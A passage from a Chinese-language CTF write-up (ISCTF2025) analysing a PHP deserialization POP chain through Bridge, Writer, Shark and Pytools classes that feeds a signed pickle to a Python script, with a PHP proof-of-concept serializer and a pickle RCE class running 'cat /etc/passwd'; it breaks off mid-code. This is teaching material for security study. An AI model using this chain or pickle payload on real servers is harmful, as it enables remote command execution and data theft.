<span class="string">&quot;python3 /var/www/html/pytools.py&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log = <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;logbuf) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;logbuf;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;logbuf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_info</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;log) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logbuf = <span class="variable language_">$this</span>-&gt;logbuf . <span class="string">&quot;\n&quot;</span> . <span class="variable language_">$this</span>-&gt;log;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是会用python解释器去执行pytools.py</p>
<p>至于pytools.py我们暂时不看，先看看如何将序列化字符串写入<code>/tmp/ssxl/run.bin</code></p>
<p>classes.php\Shark</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ser</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>=<span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ser = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">apply</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ser === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;/tmp/ssxl/run.bin&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$this</span>-&gt;ser);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看在哪能触发<code>__toString</code></p>
<p>classes.php\Bridge</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bridge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$writer</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shark</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$w</span>, <span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="variable">$w</span> <span class="keyword">instanceof</span> Writer) || !(<span class="variable">$s</span> <span class="keyword">instanceof</span> Shark)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writer = <span class="variable">$w</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shark = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;write&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable language_">$this</span>-&gt;writer <span class="keyword">instanceof</span> Writer))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writer-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;shark;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;write&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">                (<span class="variable language_">$this</span>-&gt;writer <span class="keyword">instanceof</span> Writer) &amp;&amp;</span><br><span class="line">                (<span class="variable language_">$this</span>-&gt;shark <span class="keyword">instanceof</span> Shark);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;write&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writer = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;shark&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;shark = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;write&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writer = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;shark&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;shark = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$next</span> = <span class="variable language_">$this</span>-&gt;write;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$next</span> <span class="keyword">instanceof</span> Shark) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$next</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在fetch函数中就可以看到大致的意思了，会检测next是否是一个Shark对象</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251225145432873.png" alt="image-20251225145432873"></p>
<p>并且结合api.php中的这两个操作可以知道这个链子该怎么写了</p>
<p>因为调用fetch函数后如果<code>$next</code>是一个Shark对象就会返回赋值给<code>$r</code>，而最后的echo <code>$r</code>的操作则会触发<code>__toString</code>方法</p>
<p>写一个poc</p>
<h2 id="初段POC"><a href="#初段POC" class="headerlink" title="初段POC"></a>初段POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b64data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binfile</span> = <span class="string">&quot;/tmp/ssxl/write.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metafile</span> = <span class="string">&quot;/tmp/ssxl/write.meta&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;kaqikaqi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$init</span> = <span class="string">&#x27;init&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ser</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pytools</span> <span class="keyword">extends</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = False;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logbuf</span> = <span class="string">&quot;成功写入&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bridge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$writer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shark</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pytools</span>());</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Bridge</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; writer = <span class="keyword">new</span> <span class="title class_">Writer</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; shark = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; shark -&gt; ser = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>但是<code>$this-&gt;write</code>在Bridge类中是一个不存在的属性，会触发<code>__get()</code></p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251225145942670.png" alt="image-20251225145942670"></p>
<p>在<code>__get</code>中有一个\Writer::fetch()方法的调用，跟进看一下</p>
<p>classes.php\Writer</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b64data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binfile</span> = <span class="string">&quot;/tmp/ssxl/write.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$metafile</span> = <span class="string">&quot;/tmp/ssxl/write.meta&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;kaqikaqi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$init</span> = <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b64data</span>=<span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b64data = <span class="variable">$b64data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;init&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$this</span>-&gt;binfile);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write_all</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;b64data === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$raw</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;b64data);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$raw</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;binfile, <span class="variable">$raw</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sig</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$raw</span>, <span class="variable">$this</span>-&gt;secret);</span><br><span class="line">        <span class="variable">$meta</span> = <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&quot;sig&quot;</span> =&gt; <span class="variable">$sig</span>,</span><br><span class="line">            <span class="string">&quot;ts&quot;</span>  =&gt; <span class="title function_ invoke__">time</span>(),</span><br><span class="line">        ]);</span><br><span class="line">        @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;metafile, <span class="variable">$meta</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write_all</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又是一个写文件的操作，估计跟python有关了，我们看看python代码</p>
<p>pytools.py</p>
<p>有点长，拆开看吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;cat /etc/passwd&quot;</span>,))</span><br></pre></td></tr></table></figure>

<p>一个带<code>__reduce__</code>方法的恶意RCE类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Set</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = state.get(<span class="string">&quot;secret&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.payload = state.get(<span class="string">&quot;payload&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Set类，初始化了一个secret和payload，这里有一个pickle反序列化的钩子函数<code>__setstate__</code>，在反序列化创建对象的时候不会调用<code>__init__</code>而是调用<code>__setstate__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unpickler</span>(pickle.Unpickler):</span><br><span class="line">    allows = &#123;</span><br><span class="line">        (<span class="string">&quot;__main__&quot;</span>, <span class="string">&quot;Set&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> <span class="variable language_">self</span>.allows:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>().find_class(module, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;喵喵喵?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个类继承自Unpickler，只允许反序列化<code>__main__.Set</code>类，并且重写了类加载函数，只有白名单中的类才能被反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ssxl</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.ROOT = <span class="string">&quot;/tmp/ssxl&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.BIN = <span class="string">f&quot;<span class="subst">&#123;self.ROOT&#125;</span>/write.bin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.META = <span class="string">f&quot;<span class="subst">&#123;self.ROOT&#125;</span>/write.meta&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.OUTS = <span class="string">f&quot;<span class="subst">&#123;self.ROOT&#125;</span>/outs.txt&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.SECRET = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.jmp = <span class="literal">True</span>   <span class="comment"># 你能设置这个吗😋</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_set_secret</span>(<span class="params">self, data</span>):</span><br><span class="line">        bio = io.BytesIO(data)</span><br><span class="line">        obj = Unpickler(bio).load()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(obj, <span class="type">Set</span>):</span><br><span class="line">            Games().gen_redirect()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;喵喵喵?&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="built_in">getattr</span>(obj, <span class="string">&quot;secret&quot;</span>, <span class="string">b&quot;&quot;</span>), (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="variable language_">self</span>.SECRET = obj.secret</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.ROOT):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; no ROOT&quot;</span>)</span><br><span class="line">            r = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.BIN):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; no BIN&quot;</span>)</span><br><span class="line">            r = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.META):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; no META&quot;</span>)</span><br><span class="line">            r = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_bin</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.BIN, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> bf:</span><br><span class="line">            <span class="keyword">return</span> bf.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_meta</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.META, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> jf:</span><br><span class="line">            <span class="keyword">return</span> json.load(jf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sig_check</span>(<span class="params">self, meta, data</span>):</span><br><span class="line">        sig = meta.get(<span class="string">&quot;sig&quot;</span>)</span><br><span class="line">        ts = meta.get(<span class="string">&quot;ts&quot;</span>)</span><br><span class="line">        calc = hmac.new(<span class="variable language_">self</span>.SECRET, data, hashlib.sha256).hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(sig, <span class="built_in">str</span>) 